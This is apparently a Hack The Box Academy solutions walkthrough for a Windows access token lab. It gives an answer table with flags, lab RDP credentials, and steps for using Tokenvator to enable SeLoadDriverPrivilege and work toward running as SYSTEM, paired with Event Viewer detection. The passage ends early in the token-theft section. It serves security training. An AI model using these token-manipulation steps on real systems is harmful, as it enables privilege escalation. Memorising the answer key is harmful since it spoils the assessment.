| Section                          | Question Number | Answer                        |
| -------------------------------- | --------------- | ----------------------------- |
| Windows Logon Process            | Question 1      | Kerberos                      |
| Process Internals and Protection | Question 1      | PsProtectedSignerWinTcb-Light |
| Understanding Access Tokens      | Question 1      | GenericAll                    |
| Important Token Structures       | Question 1      | SessionObject                 |
| Access Checks                    | Question 1      | DONE                          |
| Token Privileges                 | Question 1      | 0x2000                        |
| Token Enumeration                | Question 1      | BUILTIN\\Administrators       |
| Token Manipulation               | Question 1      | SeLoadDriverPrivilege         |
| Token Theft (T1134.001)          | Question 1      | GetSystem                     |
| Token Impersonation              | Question 1      | superadmin                    |
| Token Impersonation              | Question 2      | High                          |
| Make Access Tokens               | Question 1      | Admin-Sup3rS3cr3t             |
| Network Authentication           | Question 1      | ADMINS$                       |
| PPID Spoofing using Access Token | Question 1      | DONE                          |
| Detections Opportunities         | Question 1      | explorer.exe                  |
| Detections Opportunities         | Question 2      | 3140                          |
| Detections Opportunities         | Question 3      | TokenPlayer.exe               |
| Skills Assessment                | Question 1      | LEGACY\\john                  |
| Skills Assessment                | Question 2      | win-update.ps1                |
| Skills Assessment                | Question 3      | htb-token-lab.local           |
| Skills Assessment                | Question 4      | NT AUTHORITY\\SYSTEM          |
| Skills Assessment                | Question 5      | ctf-{Token-Player}-htb        |
| Skills Assessment                | Question 6      | LEGACY\\Admin-Files           |
| Skills Assessment                | Question 7      | remote.ps1                    |
| Skills Assessment                | Question 8      | token-assessment.htb.local    |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Windows Logon Process

## Question 1

### "Use LogonSessions64.exe to list sessions with processes. What is the Auth package for the user that is running the process "background-service.exe"? Answer format is \*\*\*\*\*\*\*s"

After spawning the target machine, students will establish an RDP session using the credentials `normal.user:password@123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:normal.user /p:'password@123' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.95]─[htb-ac-8414@htb-wvvnsdpi8e]─[~]
└──╼ [★]$ xfreerdp /v:10.129.233.54 /u:normal.user /p:'password@123' /dynamic-resolution

[00:18:40:184] [13160:13161] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[00:18:40:184] [13160:13161] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[00:18:40:184] [13160:13161] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[00:18:40:228] [13160:13161] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[00:18:40:228] [13160:13161] [WARN][com.freerdp.crypto] - CN = WIN-TOKEN.LEGACY.CORP
[00:18:40:229] [13160:13161] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:18:40:229] [13160:13161] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:18:40:229] [13160:13161] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:18:40:229] [13160:13161] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.233.54:3389) 
[00:18:40:229] [13160:13161] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:18:40:229] [13160:13161] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:18:40:229] [13160:13161] [ERROR][com.freerdp.crypto] - 	WIN-TOKEN.LEGACY.CORP
[00:18:40:229] [13160:13161] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.233.54:3389 (RDP-Server):
	Common Name: WIN-TOKEN.LEGACY.CORP
	Subject:     CN = WIN-TOKEN.LEGACY.CORP
	Issuer:      CN = WIN-TOKEN.LEGACY.CORP
	Thumbprint:  4c:a4:91:df:e7:e8:d8:b5:d0:5b:dc:a4:80:1d:a0:3c:31:0a:3f:6a:90:88:fa:1d:d4:76:5b:fd:9a:d4:18:c4
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open Command Prompt as an Administrator and navigate to the `C:\Tools\SysinternalsSuite` directory:

Code: cmd

```cmd
cd C:\Tools\SysinternalsSuite
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Tools\SysinternalsSuite
```

Subsequently, students will use `LogonSessions64.exe` to list the processes running in logon sessions using the `-p` option to find the authentication package related to the `background-service.exe` service:

Code: cmd

```cmd
.\LogonSessions64.exe -p
```

```
C:\Tools\SysinternalsSuite>.\LogonSessions64.exe -p

LogonSessions v1.41 - Lists logon session information
Copyright (C) 2004-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

<SNIP>

[11] Logon session 00000000:00055ede:
    User name:    LEGACY\sysadmin
    Auth package: {hidden}
    Logon type:   Batch
    Session:      0
    Sid:          S-1-5-21-1507357100-3087530421-3589589134-1111
    Logon time:   1/30/2025 12:13:24 AM
    Logon server: DC01
    DNS Domain:   LEGACY.CORP
    UPN:          sysadmin@LEGACY.CORP
     4888: background-service.exe
     4900: conhost.exe
     
<SNIP>
```

Answer: `Kerberos`

# Process Internals and Protection

## Question 1

### "Use Process Explorer to check the protection level of the running processes. Identify the protection level of wininit.exe and use it as the answer. Answer format is Ps\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*-\*\*\*\*\*"

After spawning the target machine, students will establish an RDP session using the credentials `normal.user:password@123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:normal.user /p:'password@123' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.95]─[htb-ac-8414@htb-wvvnsdpi8e]─[~]
└──╼ [★]$ xfreerdp /v:10.129.138.52 /u:normal.user /p:'password@123' /dynamic-resolution

[00:31:25:373] [33258:33260] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[00:31:25:373] [33258:33260] [WARN][com.freerdp.crypto] - CN = WIN-TOKEN.LEGACY.CORP
[00:31:25:373] [33258:33260] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:31:25:373] [33258:33260] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:31:25:373] [33258:33260] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:31:25:373] [33258:33260] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.138.52:3389) 
[00:31:25:373] [33258:33260] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:31:25:373] [33258:33260] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:31:25:373] [33258:33260] [ERROR][com.freerdp.crypto] - 	WIN-TOKEN.LEGACY.CORP
[00:31:25:373] [33258:33260] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.138.52:3389 (RDP-Server):
	Common Name: WIN-TOKEN.LEGACY.CORP
	Subject:     CN = WIN-TOKEN.LEGACY.CORP
	Issuer:      CN = WIN-TOKEN.LEGACY.CORP
	Thumbprint:  4c:a4:91:df:e7:e8:d8:b5:d0:5b:dc:a4:80:1d:a0:3c:31:0a:3f:6a:90:88:fa:1d:d4:76:5b:fd:9a:d4:18:c4
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open a Command Prompt as an Administrator and will start `procexp64.exe` (Process Explorer) located in the `C:\Tools\SysinternalsSuite` directory:

Code: cmd

```cmd
C:\Tools\SysinternalsSuite\procexp64.exe
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>C:\Tools\SysinternalsSuite\procexp64.exe
```

Next, students will scrutinize the processes and the `Protection` column to find the `wininit.exe` process and its protection. Students can also click on the Protection column to bring to the top processes with values such as `PsProtectedSignerAntimalware-Light` protection:

![[HTB Solutions/Others/z. images/22df28b5b5db2c99d0a9dc6dae027e1b_MD5.jpg]]

Answer: `PsProtectedSignerWinTcb-Light`

# Understanding Access Tokens

## Question 1

### "Open Token Viewer in PowerShell. Inspect the lsass.exe process and go to its security tab. In the DACL entries, what access does NT AUTHORITY\\SYSTEM has? Answer format is G\*\*\*\*\*\*\*\*\*"

After spawning the target machine, students will establish an RDP session using the credentials `normal.user:password@123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:normal.user /p:'password@123' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.95]─[htb-ac-8414@htb-wvvnsdpi8e]─[~]
└──╼ [★]$ xfreerdp /v:10.129.191.183 /u:normal.user /p:'password@123' /dynamic-resolution

[01:10:09:220] [94642:94643] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[01:10:09:220] [94642:94643] [WARN][com.freerdp.crypto] - CN = WIN-TOKEN.LEGACY.CORP
[01:10:09:220] [94642:94643] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:10:09:220] [94642:94643] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[01:10:09:220] [94642:94643] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:10:09:220] [94642:94643] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.191.183:3389) 
[01:10:09:220] [94642:94643] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[01:10:09:220] [94642:94643] [ERROR][com.freerdp.crypto] - Common Name (CN):
[01:10:09:220] [94642:94643] [ERROR][com.freerdp.crypto] - 	WIN-TOKEN.LEGACY.CORP
[01:10:09:220] [94642:94643] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.191.183:3389 (RDP-Server):
	Common Name: WIN-TOKEN.LEGACY.CORP
	Subject:     CN = WIN-TOKEN.LEGACY.CORP
	Issuer:      CN = WIN-TOKEN.LEGACY.CORP
	Thumbprint:  4c:a4:91:df:e7:e8:d8:b5:d0:5b:dc:a4:80:1d:a0:3c:31:0a:3f:6a:90:88:fa:1d:d4:76:5b:fd:9a:d4:18:c4
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y   
```

Students will open PowerShell as Administrator and will use the `Show-NtToken -All` command to open `Token Viewer`:

Code: powershell

```powershell
Show-NtToken -All
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> Show-NtToken -All
```

Within the `Token Viewer` application, students will use the `Text Filter` option to filter for the `lsass.exe` process and will right-click on the process and `Open Token`:

![[HTB Solutions/Others/z. images/787eff6f0cec42bb760a5b7b5ec3a59a_MD5.jpg]]

Next, students will navigate to the `Security` tab within the newly spawned window to find the access type of `NT AUTHORITY\SYSTEM` in the DACL sub-tab:

![[HTB Solutions/Others/z. images/a47ac4ded431d543c7cb972ae8d54631_MD5.jpg]]

Answer: `GenericAll`

# Important Token Structures

## Question 1

### "Explore the members of the TOKEN structure in WinDbg. What is the name of the member present at offset +0x488? Answer format is S\*\*\*\*\*\*\*\*\*\*\*\*"

After spawning the target machine, students will establish an RDP session using the credentials `normal.user:password@123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:normal.user /p:'password@123' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.95]─[htb-ac-8414@htb-ur5wytlplz]─[~]
└──╼ [★]$ xfreerdp /v:10.129.233.54 /u:normal.user /p:'password@123' /dynamic-resolution

[01:23:00:222] [11058:11059] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[01:23:00:222] [11058:11059] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[01:23:00:222] [11058:11059] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[01:23:00:270] [11058:11059] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[01:23:00:270] [11058:11059] [WARN][com.freerdp.crypto] - CN = WIN-TOKEN.LEGACY.CORP
[01:23:00:271] [11058:11059] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:23:00:271] [11058:11059] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[01:23:00:271] [11058:11059] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:23:00:271] [11058:11059] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.233.54:3389) 
[01:23:00:271] [11058:11059] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[01:23:00:271] [11058:11059] [ERROR][com.freerdp.crypto] - Common Name (CN):
[01:23:00:271] [11058:11059] [ERROR][com.freerdp.crypto] - 	WIN-TOKEN.LEGACY.CORP
[01:23:00:271] [11058:11059] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.233.54:3389 (RDP-Server):
	Common Name: WIN-TOKEN.LEGACY.CORP
	Subject:     CN = WIN-TOKEN.LEGACY.CORP
	Issuer:      CN = WIN-TOKEN.LEGACY.CORP
	Thumbprint:  4c:a4:91:df:e7:e8:d8:b5:d0:5b:dc:a4:80:1d:a0:3c:31:0a:3f:6a:90:88:fa:1d:d4:76:5b:fd:9a:d4:18:c4
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will right-click on the `WinDbg` shortcut on the Desktop and run it as Administrator:

![[HTB Solutions/Others/z. images/0943be200da37a96307e00f1e71e44f2_MD5.jpg]]

Next, students will click on `File` located in the top left corner:

![[HTB Solutions/Others/z. images/cde7f082fa24a2c4c927ab3ab13e9ef9_MD5.jpg]]

Subsequently, students will click `Attach to kernel` to begin a kernel-mode debugging and click `OK`:

![[HTB Solutions/Others/z. images/bdaf834d4ff285dcea1857b2c9a0351f_MD5.jpg]]

Students will proceed to display the type of available members within the `_TOKEN` structure using the `dt` command by specifying the `nt` alias for NT-related symbols (alias for the name of the Kernel), finding the member at offset `+0x488`:

Code: cmd

```cmd
dt nt!_TOKEN
```

![[HTB Solutions/Others/z. images/51026791f2f0034fd5b7120640bda22f_MD5.jpg]]

Answer: `SessionObject`

# Token Privileges

## Question 1

### "Open WinDbg and run the !token command to analyze the token associated with the current process. Find out the value of TokenFlags and type it as your answer. Answer format is 0x\*\*\*\*"

After spawning the target machine, students will establish an RDP session using the credentials `normal.user:password@123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:normal.user /p:'password@123' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.95]─[htb-ac-8414@htb-xghxdwrkgl]─[~]
└──╼ [★]$ xfreerdp /v:10.129.233.54 /u:normal.user /p:'password@123' /dynamic-resolution

[05:05:31:479] [10833:10834] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[05:05:31:479] [10833:10834] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[05:05:31:479] [10833:10834] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[05:05:31:531] [10833:10834] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:05:31:531] [10833:10834] [WARN][com.freerdp.crypto] - CN = WIN-TOKEN.LEGACY.CORP
[05:05:31:532] [10833:10834] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:05:31:532] [10833:10834] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[05:05:31:532] [10833:10834] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:05:31:532] [10833:10834] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.233.54:3389) 
[05:05:31:532] [10833:10834] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[05:05:31:532] [10833:10834] [ERROR][com.freerdp.crypto] - Common Name (CN):
[05:05:31:532] [10833:10834] [ERROR][com.freerdp.crypto] - 	WIN-TOKEN.LEGACY.CORP
[05:05:31:532] [10833:10834] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.233.54:3389 (RDP-Server):
	Common Name: WIN-TOKEN.LEGACY.CORP
	Subject:     CN = WIN-TOKEN.LEGACY.CORP
	Issuer:      CN = WIN-TOKEN.LEGACY.CORP
	Thumbprint:  4c:a4:91:df:e7:e8:d8:b5:d0:5b:dc:a4:80:1d:a0:3c:31:0a:3f:6a:90:88:fa:1d:d4:76:5b:fd:9a:d4:18:c4
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will right-click on the `WinDbg` shortcut on the Desktop and run it as Administrator:

![[HTB Solutions/Others/z. images/0943be200da37a96307e00f1e71e44f2_MD5.jpg]]

Next, students will click on `File` located in the top left corner:

![[HTB Solutions/Others/z. images/cde7f082fa24a2c4c927ab3ab13e9ef9_MD5.jpg]]

Subsequently, students will click `Attach to kernel` to begin a kernel-mode debugging and click `OK`:

![[HTB Solutions/Others/z. images/bdaf834d4ff285dcea1857b2c9a0351f_MD5.jpg]]

Next, students will use the `!token` extension to display information about a security token object and get the value of `TokenFlags`:

Code: cmd

```cmd
!token
```

![[HTB Solutions/Others/z. images/3d862b1e06a2cccf862aea054c761a0d_MD5.jpg]]

Answer: `0x2000`

# Token Enumeration

## Question 1

### "As a Non-Admin user, enumerate the current token by running the PowerShell command "ConvertTo-Json(Get-NtToken).DenyOnlyGroups" and type the name of Deny-Only-Group as your answer. Answer format is B\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*"

After spawning the target machine, students will establish an RDP session using the credentials `normal.user:password@123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:normal.user /p:'password@123' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.95]─[htb-ac-8414@htb-xghxdwrkgl]─[~]
└──╼ [★]$ xfreerdp /v:10.129.160.13 /u:normal.user /p:'password@123' /dynamic-resolution

[05:24:38:008] [39744:39745] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:24:38:008] [39744:39745] [WARN][com.freerdp.crypto] - CN = WIN-TOKEN.LEGACY.CORP
[05:24:38:009] [39744:39745] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:24:38:009] [39744:39745] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[05:24:38:009] [39744:39745] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:24:38:009] [39744:39745] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.160.13:3389) 
[05:24:38:009] [39744:39745] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[05:24:38:009] [39744:39745] [ERROR][com.freerdp.crypto] - Common Name (CN):
[05:24:38:009] [39744:39745] [ERROR][com.freerdp.crypto] - 	WIN-TOKEN.LEGACY.CORP
[05:24:38:009] [39744:39745] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.160.13:3389 (RDP-Server):
	Common Name: WIN-TOKEN.LEGACY.CORP
	Subject:     CN = WIN-TOKEN.LEGACY.CORP
	Issuer:      CN = WIN-TOKEN.LEGACY.CORP
	Thumbprint:  4c:a4:91:df:e7:e8:d8:b5:d0:5b:dc:a4:80:1d:a0:3c:31:0a:3f:6a:90:88:fa:1d:d4:76:5b:fd:9a:d4:18:c4
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell and will use the provided `ConvertTo-Json` cmdlet in the exercise to attain the value for the `Deny-Only-Group` in the results within the `Name` parameter:

Code: powershell

```powershell
ConvertTo-Json(Get-NtToken).DenyOnlyGroups
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\normal.user> ConvertTo-Json(Get-NtToken).DenyOnlyGroups

[
    {
        "Sid":  {
                    "Authority":  "Nt",
                    "SubAuthorities":  "32 544",
                    "Name":  "{hidden}",
                    "Parent":  "S-1-5-32"
                },
        "Attributes":  16,
        "Enabled":  false,
        "Mandatory":  false,
        "DenyOnly":  true,
        "Name":  "{hidden}"
    }
]
```

Answer: `BUILTIN\\Administrators`

# Token Manipulation

## Question 1

### "Using tokenvator.exe, enable the privilege that helps to load and unload device drivers, and detect this activity in Event Viewer. Once done, type your answer as the privilege name. Answer format is Se\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*"

After spawning the target machine, students will establish an RDP session using the credentials `normal.user:password@123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:normal.user /p:'password@123' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.95]─[htb-ac-8414@htb-xghxdwrkgl]─[~]
└──╼ [★]$ xfreerdp /v:10.129.228.250 /u:normal.user /p:'password@123' /dynamic-resolution

[05:46:25:157] [72785:72786] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:46:25:157] [72785:72786] [WARN][com.freerdp.crypto] - CN = WIN-TOKEN.LEGACY.CORP
[05:46:25:157] [72785:72786] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:46:25:157] [72785:72786] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[05:46:25:157] [72785:72786] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:46:25:157] [72785:72786] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.228.250:3389) 
[05:46:25:157] [72785:72786] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[05:46:25:157] [72785:72786] [ERROR][com.freerdp.crypto] - Common Name (CN):
[05:46:25:157] [72785:72786] [ERROR][com.freerdp.crypto] - 	WIN-TOKEN.LEGACY.CORP
[05:46:25:157] [72785:72786] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.228.250:3389 (RDP-Server):
	Common Name: WIN-TOKEN.LEGACY.CORP
	Subject:     CN = WIN-TOKEN.LEGACY.CORP
	Issuer:      CN = WIN-TOKEN.LEGACY.CORP
	Thumbprint:  4c:a4:91:df:e7:e8:d8:b5:d0:5b:dc:a4:80:1d:a0:3c:31:0a:3f:6a:90:88:fa:1d:d4:76:5b:fd:9a:d4:18:c4
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open Command Prompt as Administrator and will list the current privileges the user has to find the `SeLoadDriverPrivilege`, which helps load and unload device drivers being disabled:

Code: cmd

```cmd
whoami /priv
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled

<SNIP>
```

Next, students will navigate to `C:\Tools` and use `Tokenvator.exe` to enable the privilege with the `Enable_Privilege` command:

Code: cmd

```cmd
cd C:\Tools
.\Tokenvator.exe
Enable_Privilege /Privilege:SeLoadDriverPrivilege
```

```
C:\Windows\system32>cd C:\Tools

C:\Tools>.\Tokenvator.exe

(Tokens) > Enable_Privilege /Privilege:SeLoadDriverPrivilege

Option               Value
------               -----
privilege            SeLoadDriverPrivilege

[*] Adjusting Token Privilege SeLoadDriverPrivilege => SE_PRIVILEGE_ENABLED
 [+] Recieved luid
 [*] AdjustTokenPrivilege
 [+] Adjusted Privilege: SeLoadDriverPrivilege
 [+] Privilege State: SE_PRIVILEGE_ENABLED
```

Once enabled, students will open `Event Viewer`, navigate to `Windows Logs` -> `Security`, and set a filter on [Event ID 4703](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4703) (A user right was adjusted) related to token privileges being enabled or disabled for a specific account's context:

![[HTB Solutions/Others/z. images/e3b625c9d5e401006d7bd7ee2efa941c_MD5.jpg]]

Scrutinizing the events, students will find the enabled privilege using `Tokenvator.exe` for the `normal.user` user account:

![[HTB Solutions/Others/z. images/0934624f7728eee034ac71403603b7cb_MD5.jpg]]

Answer: `SeLoadDriverPrivilege`

# Token Theft (T1134.001)

## Question 1

### "Explore tokenvator.exe and figure out how to operate as NT AUTHORITY\\SYSTEM using it. Type the command as your answer."

After spawning the target machine, students will establish an RDP session using the credentials `normal.user:password@123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:normal.user /p:'password@123' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.95]─[htb-ac-8414@htb-uoynqlpxe1]─[~]
└──╼ [★]$ xfreerdp /v:10.129.233.54 /u:normal.user /p:'password@123' /dynamic-resolution

[06:08:52:331] [7289:7290] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[06:08:52:331] [7289:7290] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[06:08:52:331] [7289:7290] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[06:08:52:386] [7289:7290] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[06:08:52:386] [7289:7290] [WARN][com.freerdp.crypto] - CN = WIN-TOKEN.LEGACY.CORP
[06:08:52:387] [7289:7290] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[06:08:52:387] [7289:7290] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[06:08:52:387] [7289:7290] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[06:08:52:387] [7289:7290] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.233.54:3389) 
[06:08:52:387] [7289:7290] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[06:08:52:387] [7289:7290] [ERROR][com.freerdp.crypto] - Common Name (CN):
[06:08:52:387] [7289:7290] [ERROR][com.freerdp.crypto] - 	WIN-TOKEN.LEGACY.CORP
[06:08:52:387] [7289:7290] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.233.54:3389 (RDP-Server):
	Common Name: WIN-TOKEN.LEGACY.CORP
	Subject:     CN = WIN-TOKEN.LEGACY.CORP
	Issuer:      CN = WIN-TOKEN.LEGACY.CORP
	Thumbprint:  4c:a4:91:df:e7:e8:d8:b5:d0:5b:dc:a4:80:1d:a0:3c:31:0a:3f:6a:90:88:fa:1d:d4:76:5b:fd:9a:d4:18:c4
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open Command Prompt, navigate to the `C:\Tools` directory, and start `Tokenvator.exe`:

Code: cmd

```cmd
cd C:\Tools
.\Tokenvator.exe
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\normal.user>cd C:\Tools

C:\Tools>.\Tokenvator.exe
```

